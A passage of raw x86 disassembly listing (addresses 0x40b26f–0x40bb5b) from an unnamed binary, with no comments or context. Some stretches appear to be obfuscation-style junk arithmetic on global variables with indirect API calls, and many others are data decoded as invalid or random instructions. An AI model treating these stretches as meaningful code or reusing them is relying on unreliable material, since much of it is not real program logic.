  40b26f:	mov    al,0xc0
  40b271:	pop    esp
  40b272:	test   BYTE PTR [eax-0x6f80ff59],al
  40b278:	bound  ecx,QWORD PTR [eax]
  40b27a:	cwde   
  40b27b:	pop    edx
  40b27c:	inc    ebp
  40b27d:	(bad)  
  40b27e:	mov    dh,0xd3
  40b280:	nop
  40b281:	xlat   BYTE PTR ds:[ebx]
  40b282:	sbb    ch,0xf8
  40b285:	sub    ebx,DWORD PTR [ecx+0x720ff0df]
  40b28b:	mov    ebx,0x7c7efe9c
  40b290:	jl     0x40b30a
  40b292:	xchg   ebx,eax
  40b293:	scas   eax,DWORD PTR es:[edi]
  40b294:	jmp    0x40b299
  40b296:	inc    ecx
  40b297:	sbb    dh,BYTE PTR [ecx+0x70464154]
  40b29d:	lahf   
  40b29e:	sbb    al,BYTE PTR [edx+0x11]
  40b2a1:	test   ecx,0xea9147d
  40b2a7:	mov    edi,0xa80e204a
  40b2ac:	jl     0x40b2ef
  40b2ae:	fwait
  40b2af:	jnp    0x40b26f
  40b2b1:	scas   al,BYTE PTR es:[edi]
  40b2b2:	(bad)  
  40b2b3:	sub    DWORD PTR [esi+0x36371acc],edi
  40b2b9:	call   0xa2c9:0xae89ab2b
  40b2c0:	fs pop ebp
  40b2c2:	mov    cl,0xd5
  40b2c4:	out    0x8d,eax
  40b2c6:	lahf   
  40b2c7:	mov    ds:0x26a0a5b2,al
  40b2cc:	or     eax,0x92dfc428
  40b2d1:	retf   
  40b2d2:	add    eax,0xa6195965
  40b2d7:	cdq    
  40b2d8:	aaa    
  40b2d9:	in     al,dx
  40b2da:	les    ebp,FWORD PTR ds:0x25ff72a6
  40b2e0:	cs pop edi
  40b2e2:	std    
  40b2e3:	push   ss
  40b2e4:	test   DWORD PTR [ecx+0x5e864f56],ebx
  40b2ea:	mov    eax,0x18c81e5c
  40b2ef:	popa   
  40b2f0:	shl    BYTE PTR [edi-0x5f],0x35
  40b2f4:	add    bh,BYTE PTR [ebp-0x5f]
  40b2f7:	xchg   ebp,eax
  40b2f8:	mov    dh,0x36
  40b2fa:	xchg   edi,eax
  40b2fb:	push   eax
  40b2fc:	and    al,0x3e
  40b2fe:	xor    al,0x23
  40b300:	sub    BYTE PTR [ebx+0x6be343f0],0xe1
  40b307:	push   esi
  40b308:	(bad)  
  40b309:	jae    0x40b33a
  40b30b:	pop    ds
  40b30c:	pop    ecx
  40b30d:	shl    BYTE PTR [eax],0x33
  40b310:	dec    ebx
  40b311:	push   esp
  40b312:	sub    DWORD PTR [ebx-0x54ea7eb0],0xffffff82
  40b319:	inc    edx
  40b31a:	add    BYTE PTR [ebx-0x7e],ah
  40b31d:	inc    edx
  40b31e:	add    al,ch
  40b320:	cld    
  40b321:	mov    eax,0x351b0000
  40b326:	push   edi
  40b327:	add    BYTE PTR [edx+0x0],0x8b
  40b32b:	dec    ebp
  40b32c:	loopne 0x40b2af
  40b32e:	(bad)  
  40b32f:	xchg   BYTE PTR [ecx],ch
  40b331:	add    BYTE PTR [eax],al
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x4281eb,0x4282ab
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428343,0x4282ab
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42832b,0x42821f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42835f,0x4281ff
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42825f
  40b386:	adc    DWORD PTR ds:0x428153,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x4282c7,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428233,0x42821f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42812b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428347,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428127,0x42835b
  40b3c4:	call   0x422031
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42822b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42825b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428243,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x4282db
  40b3f3:	mov    eax,ds:0x428253
  40b3f8:	cmp    DWORD PTR ds:0x42825b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428e9c
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42814b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42823b
  40b422:	or     DWORD PTR ds:0x4282cb,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428127,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428353,0x0
  40b441:	mov    DWORD PTR ds:0x4282cb,ecx
  40b447:	mov    DWORD PTR ds:0x42834b,0x318c
  40b451:	mov    DWORD PTR ds:0x42835b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428223,0x461b
  40b46a:	mov    DWORD PTR ds:0x42825f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428353,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ea0
  40b48f:	xor    edx,DWORD PTR ds:0x428233
  40b495:	adc    ecx,DWORD PTR ds:0x42833b
  40b49b:	and    DWORD PTR ds:0x42812b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42823f
  40b4b7:	xor    DWORD PTR ds:0x428353,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428223
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42813f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42811b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x4281eb,0x9f5
  40b501:	mov    DWORD PTR ds:0x428267,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42813f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427f93
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428d88
  40b528:	sbb    DWORD PTR ds:0x428257,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x42818f
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x42837b
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42815b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428203
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428233
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x428263,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42833b,0x428203
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0x79
  40b596:	out    0xaa,ax
  40b599:	or     dl,BYTE PTR [ebx]
  40b59b:	sbb    BYTE PTR [eax],bl
  40b59d:	outs   dx,BYTE PTR ds:[esi]
  40b59e:	adc    bl,BYTE PTR [eax]
  40b5a0:	sbb    BYTE PTR [eax+0x22],al
  40b5a3:	push   edi
  40b5a4:	sub    DWORD PTR [edx],esp
  40b5a6:	inc    ebx
  40b5a7:	dec    esi
  40b5a8:	shl    DWORD PTR [edx-0x7b43ae24],0x5b
  40b5af:	push   ds
  40b5b0:	push   ss
  40b5b1:	mov    bl,0x49
  40b5b3:	xor    al,0xfc
  40b5b5:	sub    DWORD PTR [ebp-0x68],0xffffffd1
  40b5b9:	rol    DWORD PTR [ebx+0x3a914f83],0x7f
  40b5c0:	out    0xf4,al
  40b5c2:	mov    BYTE PTR [esi],bl
  40b5c4:	call   0xf9169166
  40b5c9:	scas   eax,DWORD PTR es:[edi]
  40b5ca:	mov    es,WORD PTR [ebp+0x3f64b73d]
  40b5d0:	inc    ecx
  40b5d1:	mov    eax,DWORD PTR [eax]
  40b5d3:	jge    0x40b58c
  40b5d5:	mov    al,ds:0x431158c9
  40b5da:	xor    ecx,DWORD PTR ds:0xd1789d0
  40b5e0:	retf   
  40b5e1:	inc    eax
  40b5e2:	push   0xf31db645
  40b5e7:	adc    eax,DWORD PTR [ebx-0x7e965c5b]
  40b5ed:	mov    WORD PTR [edi-0x55f51222],gs
  40b5f3:	pop    ss
  40b5f4:	push   0xc9989483
  40b5f9:	(bad)  
  40b5fa:	aad    0xe1
  40b5fc:	enter  0x2d5b,0x96
  40b600:	mov    ebp,0x5b7412ef
  40b605:	inc    eax
  40b606:	inc    edi
  40b607:	in     al,dx
  40b608:	jmp    0x40b624
  40b60a:	in     eax,dx
  40b60b:	push   0x49
  40b60d:	es int 0x42
  40b610:	fst    QWORD PTR [ecx]
  40b612:	stc    
  40b613:	pop    ss
  40b614:	mov    cl,0x3a
  40b616:	in     al,0x45
  40b618:	sbb    eax,0x725339ff
  40b61d:	pop    edi
  40b61e:	jne    0x40b651
  40b620:	cwde   
  40b621:	xchg   esi,eax
  40b622:	push   ss
  40b623:	mov    BYTE PTR [esi],cl
  40b625:	sti    
  40b626:	inc    eax
  40b627:	jl     0x40b60e
  40b629:	inc    eax
  40b62a:	pop    ecx
  40b62b:	pop    edi
  40b62c:	pushf  
  40b62d:	or     eax,0xd659c1e3
  40b632:	push   cs
  40b633:	cmp    eax,0xea8788c1
  40b638:	pop    ebx
  40b639:	daa    
  40b63a:	in     al,dx
  40b63b:	inc    edx
  40b63c:	jae    0x40b606
  40b63e:	mov    eax,ds:0x260eb8b9
  40b643:	jmp    0x40b679
  40b645:	inc    edi
  40b646:	gs pop esi
  40b648:	les    esi,FWORD PTR [edx]
  40b64a:	mov    di,0xf7e0
  40b64e:	je     0x40b61b
  40b650:	sbb    BYTE PTR [edi+0x27026441],dl
  40b656:	lods   eax,DWORD PTR ds:[esi]
  40b657:	add    DWORD PTR fs:[ecx],esi
  40b65a:	mov    BYTE PTR [edi+0x629d85ac],cl
  40b660:	out    dx,al
  40b661:	push   cs
  40b662:	pop    es
  40b663:	mov    ebp,DWORD PTR [esi+0xc]
  40b666:	stc    
  40b667:	cli    
  40b668:	inc    edx
  40b669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b66a:	adc    DWORD PTR [eax],0xe
  40b66d:	fsubr  DWORD PTR [ecx-0x5608a2f9]
  40b673:	fisttp WORD PTR [ebp+0x63]
  40b676:	stos   BYTE PTR es:[edi],al
  40b677:	retf   
  40b678:	jnp    0x40b6a3
  40b67a:	ss xchg edi,eax
  40b67c:	div    DWORD PTR [esp+eiz*8+0x26]
  40b680:	mov    esp,0xd502ace1
  40b685:	xchg   esi,eax
  40b686:	mov    ds:0xfbfbead2,al
  40b68b:	fistp  WORD PTR [edi+0x4ff7d201]
  40b691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b692:	out    0xa5,al
  40b694:	sub    DWORD PTR [edx],esp
  40b696:	cli    
  40b697:	fs push ecx
  40b699:	(bad)  
  40b69b:	clc    
  40b69c:	iret   
  40b69d:	pop    ebp
  40b69e:	xor    eax,0xf043915d
  40b6a3:	cdq    
  40b6a4:	mov    cl,dh
  40b6a6:	or     eax,0xa89f3f30
  40b6ab:	jl     0x40b64d
  40b6ad:	xchg   esi,eax
  40b6ae:	push   ebx
  40b6af:	push   cs
  40b6b0:	mov    ds:0xf23861aa,eax
  40b6b5:	in     eax,dx
  40b6b6:	add    BYTE PTR [ebp+0x27],dh
  40b6b9:	lock or al,dl
  40b6bc:	nop
  40b6bd:	rcl    bh,1
  40b6bf:	push   ebx
  40b6c0:	add    BYTE PTR [esi+0x68],ah
  40b6c3:	cwde   
  40b6c4:	xor    eax,0xfe508ef2
  40b6c9:	dec    ebp
  40b6ca:	lea    ebp,[ebx]
  40b6cc:	jae    0x40b712
  40b6ce:	or     eax,DWORD PTR [eax-0xe7e03f7]
  40b6d4:	pop    esi
  40b6d5:	ins    BYTE PTR es:[edi],dx
  40b6d6:	push   cs
  40b6d7:	jmp    0x40b6a9
  40b6d9:	jp     0x40b732
  40b6db:	cmp    DWORD PTR [esi-0x46],ebx
  40b6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6df:	icebp  
  40b6e0:	cmp    eax,DWORD PTR [edi+0x43]
  40b6e3:	mov    ecx,ecx
  40b6e5:	pop    ebp
  40b6e6:	dec    ecx
  40b6e7:	mov    fs,ebp
  40b6e9:	(bad)  
  40b6ea:	aad    0xf
  40b6ec:	rol    DWORD PTR [ebp+0xb15b041],cl
  40b6f2:	dec    edi
  40b6f3:	bnd jns 0x40b6a7
  40b6f6:	push   ebx
  40b6f7:	(bad)  
  40b6f8:	pop    ecx
  40b6f9:	mov    esi,0x3bd1ab10
  40b6fe:	sub    al,0xcd
  40b700:	xor    bl,ah
  40b702:	mov    WORD PTR ds:0x30a933a1,es
  40b708:	xchg   esp,eax
  40b709:	or     DWORD PTR [ebp-0x17731d38],edx
  40b70f:	or     DWORD PTR [ecx-0x28510ceb],ecx
  40b715:	aaa    
  40b716:	dec    ebp
  40b717:	or     dh,BYTE PTR [edx]
  40b719:	lea    ebx,[eax+0x2c]
  40b71c:	or     BYTE PTR [ebp+0x7],al
  40b71f:	jle    0x40b6a9
  40b721:	jb     0x40b756
  40b723:	push   ss
  40b724:	ja     0x40b741
  40b726:	inc    edx
  40b727:	call   0xc071836a
  40b72c:	ret    0x9ff3
  40b72f:	sub    al,dh
  40b731:	dec    ebp
  40b732:	sbb    DWORD PTR [ebp+0x45f3c74e],esi
  40b738:	jle    0x40b754
  40b73a:	and    dl,BYTE PTR [esi-0x36]
  40b73d:	mov    ch,0xe1
  40b73f:	adc    DWORD PTR [eax+eiz*8-0x24],edi
  40b743:	jle    0x40b783
  40b745:	stos   BYTE PTR es:[edi],al
  40b746:	mov    ds:0xc53fa24b,eax
  40b74b:	xchg   ebp,eax
  40b74c:	call   0x2df7:0x9a72e279
  40b753:	mov    ecx,0xd729ef57
  40b758:	call   0x6eda:0xbb2b0152
  40b75f:	pusha  
  40b760:	jo     0x40b787
  40b762:	(bad)  
  40b763:	test   DWORD PTR [esp+ebp*2],0x6a5d4a71
  40b76a:	inc    esi
  40b76b:	sbb    DWORD PTR [edx+0x46],esi
  40b76e:	enter  0xedff,0xdd
  40b772:	(bad)  
  40b773:	mov    esi,0x69be983e
  40b778:	iret   
  40b779:	repnz ins DWORD PTR es:[edi],dx
  40b77b:	cmp    ax,0xf886
  40b77f:	sub    cl,BYTE PTR [edx]
  40b781:	dec    esi
  40b782:	and    eax,0x35d68ae8
  40b787:	mov    ch,0x51
  40b789:	imul   ecx,esi,0x7
  40b78c:	add    BYTE PTR [ebx+0x6e],cl
  40b78f:	in     al,0xf5
  40b791:	xchg   ecx,eax
  40b792:	push   edi
  40b793:	jbe    0x40b78b
  40b795:	adc    DWORD PTR [edx+0x5b],esp
  40b798:	aaa    
  40b799:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40b79b:	mov    eax,ds:0x47a258e6
  40b7a0:	mov    al,BYTE PTR [edx]
  40b7a2:	test   DWORD PTR [ebx],edx
  40b7a4:	sti    
  40b7a5:	inc    ecx
  40b7a6:	(bad)  
  40b7a7:	push   ds
  40b7a8:	adc    eax,0xcb35535b
  40b7ad:	push   edx
  40b7ae:	clc    
  40b7af:	sbb    eax,0x73c16e3d
  40b7b4:	jge    0x40b75f
  40b7b6:	push   edi
  40b7b7:	scas   al,BYTE PTR es:[edi]
  40b7b8:	push   edi
  40b7b9:	test   al,0xfb
  40b7bb:	(bad)  
  40b7bc:	sub    BYTE PTR [ecx+0x5c],al
  40b7bf:	shr    BYTE PTR [esi+0x42],cl
  40b7c2:	leave  
  40b7c3:	adc    ebx,ebx
  40b7c5:	in     al,0x4c
  40b7c7:	nop
  40b7c8:	xor    cl,BYTE PTR [ebx+0x75]
  40b7cb:	stc    
  40b7cc:	dec    eax
  40b7cd:	adc    ebx,DWORD PTR [ebp-0x2c41e166]
  40b7d3:	add    DWORD PTR [edi],ebx
  40b7d5:	push   eax
  40b7d6:	mov    edx,0xccd2bd18
  40b7db:	mov    esi,0x65c77cfc
  40b7e0:	(bad)  
  40b7e1:	xchg   edx,eax
  40b7e2:	cmp    eax,0x25ebf146
  40b7e7:	pop    ebx
  40b7e8:	push   es
  40b7e9:	cwde   
  40b7ea:	aas    
  40b7eb:	and    DWORD PTR [edx-0x33d17b78],esi
  40b7f1:	jnp    0x40b7d7
  40b7f3:	push   esp
  40b7f4:	adc    al,bl
  40b7f6:	pop    esp
  40b7f7:	xchg   esi,eax
  40b7f8:	jmp    FWORD PTR [edi+0x6a1f9d30]
  40b7fe:	mov    bl,0x55
  40b800:	sbb    BYTE PTR [esi],ch
  40b802:	or     BYTE PTR ss:[ecx+ebx*8+0x3b722e32],cl
  40b80a:	pop    ss
  40b80b:	in     eax,0x7d
  40b80d:	inc    esi
  40b80e:	fiadd  WORD PTR [esp+ecx*2+0xce26371]
  40b815:	dec    edx
  40b816:	and    eax,0x23d6e91e
  40b81b:	in     eax,dx
  40b81c:	repnz addr16 and al,0xa2
  40b820:	jae    0x40b81d
  40b822:	add    ecx,0xb4cfa2ae
  40b828:	stc    
  40b829:	fdivr  QWORD PTR [ecx]
  40b82b:	dec    ebp
  40b82c:	(bad)
  40b830:	daa    
  40b831:	xor    ch,al
  40b833:	pop    edx
  40b834:	sar    BYTE PTR [ecx],cl
  40b836:	or     DWORD PTR [esi-0x1d],0xffffffcf
  40b83a:	mov    DWORD PTR [ecx-0x3d],ebx
  40b83d:	pushf  
  40b83e:	push   ds
  40b83f:	popf   
  40b840:	in     eax,0x88
  40b842:	pop    ebp
  40b843:	mov    ?,WORD PTR [esi+ebx*2-0x4250b609]
  40b84a:	and    al,0xd2
  40b84c:	ret    
  40b84d:	outs   dx,BYTE PTR ds:[esi]
  40b84e:	retf   
  40b84f:	jns    0x40b88c
  40b851:	(bad)  
  40b852:	lods   eax,DWORD PTR ds:[esi]
  40b853:	xchg   BYTE PTR [ebp+0x3a],bh
  40b856:	in     al,dx
  40b857:	test   DWORD PTR [esi],ebx
  40b859:	sub    dl,cl
  40b85b:	jbe    0x40b7f7
  40b85d:	and    DWORD PTR [edi],ebp
  40b85f:	out    dx,eax
  40b860:	std    
  40b861:	cmp    esp,DWORD PTR [ecx+edx*8]
  40b864:	mov    edi,0xaaafe765
  40b869:	dec    edx
  40b86a:	rcl    ebp,cl
  40b86c:	cmp    al,0x98
  40b86e:	out    0x10,al
  40b870:	icebp  
  40b871:	dec    eax
  40b872:	jge    0x40b8e5
  40b874:	or     al,0x36
  40b876:	push   edi
  40b877:	jecxz  0x40b8dd
  40b879:	or     eax,DWORD PTR [edx]
  40b87b:	iret   
  40b87c:	icebp  
  40b87d:	lods   al,BYTE PTR ds:[esi]
  40b87e:	adc    al,0xe8
  40b880:	xor    ch,BYTE PTR ds:0xf5948906
  40b886:	(bad)  
  40b887:	xlat   BYTE PTR ds:[ebx]
  40b888:	sub    eax,0xee0853c8
  40b88d:	mov    bh,0x9
  40b88f:	and    ch,BYTE PTR [ebx-0x1c]
  40b892:	cmp    al,0x9e
  40b894:	cmp    BYTE PTR [ecx+0x5e],al
  40b897:	fdivr  DWORD PTR [eiz*8-0x1a2a8bc]
  40b89e:	cmp    al,0xb9
  40b8a0:	out    0x3,eax
  40b8a2:	inc    ebp
  40b8a3:	push   cs
  40b8a4:	out    dx,eax
  40b8a5:	and    al,BYTE PTR [ebp+0x27]
  40b8a8:	ror    BYTE PTR [edi+0x42],1
  40b8ab:	mov    cl,BYTE PTR [edi-0x153b0bbf]
  40b8b1:	dec    edi
  40b8b2:	data16 sub al,0x12
  40b8b5:	cmp    eax,0x6ae7fc7c
  40b8ba:	mov    ecx,0x294521d5
  40b8bf:	inc    edx
  40b8c0:	js     0x40b935
  40b8c2:	leave  
  40b8c3:	push   ecx
  40b8c4:	cmp    ah,BYTE PTR [edi+0x1f984b45]
  40b8ca:	mov    esp,0x6061c7d0
  40b8cf:	sub    eax,0xa8ec3a1a
  40b8d4:	xchg   edx,eax
  40b8d5:	repnz out dx,eax
  40b8d7:	jo     0x40b88f
  40b8d9:	or     al,0xcb
  40b8db:	sub    eax,DWORD PTR [ebp+0x6d31f7e1]
  40b8e1:	xchg   DWORD PTR ds:0xec72334f,ebp
  40b8e7:	outs   dx,BYTE PTR ds:[esi]
  40b8e8:	mov    bl,0x51
  40b8ea:	inc    ecx
  40b8eb:	js     0x40b8ea
  40b8ed:	or     BYTE PTR [edi],ch
  40b8ef:	sub    DWORD PTR [edi-0x55b548aa],0xef316f19
  40b8f9:	ds inc ebx
  40b8fb:	loopne 0x40b91c
  40b8fd:	daa    
  40b8fe:	js     0x40b883
  40b900:	mov    ecx,0x862f90e6
  40b905:	fmul   QWORD PTR [eax+0x4f]
  40b908:	fsub   QWORD PTR [ecx-0xe75cd83]
  40b90e:	lods   eax,DWORD PTR ds:[esi]
  40b90f:	xor    bl,dh
  40b911:	add    al,0x49
  40b913:	aam    0x78
  40b915:	pop    ebp
  40b916:	mov    BYTE PTR [ebp-0x249a4cc0],ch
  40b91c:	arpl   bp,sp
  40b91e:	jge    0x40b967
  40b920:	bswap  edx
  40b922:	iret   
  40b923:	es push ecx
  40b925:	push   ebx
  40b926:	gs in  eax,0x8d
  40b929:	jp     0x40b926
  40b92b:	mov    ah,0x10
  40b92d:	xor    dl,cl
  40b92f:	cdq    
  40b930:	dec    esi
  40b931:	mov    al,ds:0x6f4eff41
  40b936:	test   al,0x26
  40b938:	adc    esp,DWORD PTR [ebp+0x6a]
  40b93b:	(bad)
  40b93e:	je     0x40b94d
  40b940:	mov    dl,0x94
  40b942:	jg     0x40b9b6
  40b944:	add    eax,0x28f6b4a6
  40b949:	push   es
  40b94a:	cmp    cl,dh
  40b94c:	or     DWORD PTR [eax],edx
  40b94e:	mov    dl,0xec
  40b950:	pop    ebp
  40b951:	jg     0x40b8fc
  40b953:	pop    eax
  40b954:	mov    ecx,0xac49070a
  40b959:	sub    bh,BYTE PTR [esi+edi*1+0x68]
  40b95d:	dec    edi
  40b95e:	ret    0xbc6a
  40b961:	fnstenv [esi+0x6a0b7595]
  40b967:	mov    cl,0x16
  40b969:	mov    dl,0xdb
  40b96b:	in     al,0xe5
  40b96d:	test   bl,bl
  40b96f:	es loop 0x40b9a4
  40b972:	push   es
  40b973:	push   0x25a15267
  40b978:	xor    DWORD PTR [eax+0x5],esp
  40b97b:	pop    esp
  40b97c:	xor    eax,0xd1810000
  40b981:	sbb    DWORD PTR [eax],ecx
  40b983:	add    BYTE PTR [eax],al
  40b985:	adc    DWORD PTR ds:0x4282b3,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428237
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x4282c7,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x4282cf,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428237,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x4282cf,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42835f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x4282cf,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428d8c
  40b9f7:	adc    DWORD PTR ds:0x42835b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282b7
  40ba0a:	sub    edx,DWORD PTR ds:0x4282cb
  40ba10:	mov    DWORD PTR ds:0x4282b7,edx
  40ba16:	adc    DWORD PTR ds:0x4282b3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428127
  40ba26:	xor    DWORD PTR ds:0x428353,edx
  40ba2c:	or     DWORD PTR ds:0x4281ff,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428237
  40ba3c:	or     DWORD PTR ds:0x4282d3,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	and    edx,DWORD PTR [ebx+edi*4]
  40baa6:	mov    al,0x60
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	cdq    
  40bab0:	jmp    0x7d18:0xadd31a4
  40bab7:	mov    ch,0xfc
  40bab9:	les    esi,FWORD PTR [ebx+0x7a3c31ec]
  40babf:	ds or  al,0x2d
  40bac2:	dec    edi
  40bac3:	push   eax
  40bac4:	mov    BYTE PTR ds:0x285bd348,cl
  40baca:	adc    DWORD PTR [edi],0x24
  40bacd:	(bad)  
  40bace:	mov    ah,0xde
  40bad0:	arpl   WORD PTR [esi+ebp*1+0x25b86132],bp
  40bad7:	cmp    bh,BYTE PTR [esp+ebx*1-0x2b635802]
  40bade:	xor    DWORD PTR ds:0xf07eb30e,0xffffff92
  40bae5:	inc    ecx
  40bae6:	mov    ds:0xd4bb2add,al
  40baeb:	push   ebp
  40baec:	test   BYTE PTR [eax-0x5dc2a7db],0xdc
  40baf3:	cmp    ecx,edx
  40baf5:	adc    DWORD PTR [edx],ecx
  40baf7:	and    eax,0x731e23cd
  40bafc:	js     0x40bb17
  40bafe:	add    BYTE PTR [edi+0x56],dh
  40bb01:	call   0x5484:0x56bc2847
  40bb08:	mov    ebp,0xb53e6865
  40bb0d:	push   ss
  40bb0e:	popf   
  40bb0f:	cmp    eax,0xa42365ad
  40bb14:	std    
  40bb15:	cmp    edi,eax
  40bb17:	mov    eax,0x78e036b3
  40bb1c:	cwde   
  40bb1d:	add    esi,DWORD PTR [eax+ebp*4]
  40bb20:	push   0x76f3b7ef
  40bb25:	mov    eax,0xb1568c06
  40bb2a:	es jle 0x40bad6
  40bb2d:	xlat   BYTE PTR ds:[ebx]
  40bb2e:	xor    al,0x23
  40bb30:	or     dh,BYTE PTR [ecx-0x20]
  40bb33:	nop
  40bb34:	adc    BYTE PTR [ebx+0x6d],dl
  40bb37:	outs   dx,DWORD PTR ds:[esi]
  40bb38:	or     dh,BYTE PTR [ebx]
  40bb3a:	push   cs
  40bb3b:	mov    ecx,DWORD PTR [edx]
  40bb3d:	(bad)  
  40bb3e:	int    0x11
  40bb40:	jbe    0x40bb5c
  40bb42:	in     al,dx
  40bb43:	adc    bh,BYTE PTR [edx+0x76]
  40bb46:	fcomip st,st(7)
  40bb48:	cli    
  40bb49:	jl     0x40bb82
  40bb4b:	stos   DWORD PTR es:[edi],eax
  40bb4c:	add    bh,BYTE PTR [edx+0xc5ffd4a]
  40bb52:	std    
  40bb53:	les    eax,FWORD PTR [esi]
  40bb55:	inc    esp
  40bb56:	stc    
  40bb57:	stos   DWORD PTR es:[edi],eax
  40bb58:	hlt    
  40bb59:	and    al,0xd2
  40bb5b:	xchg   edx,eax
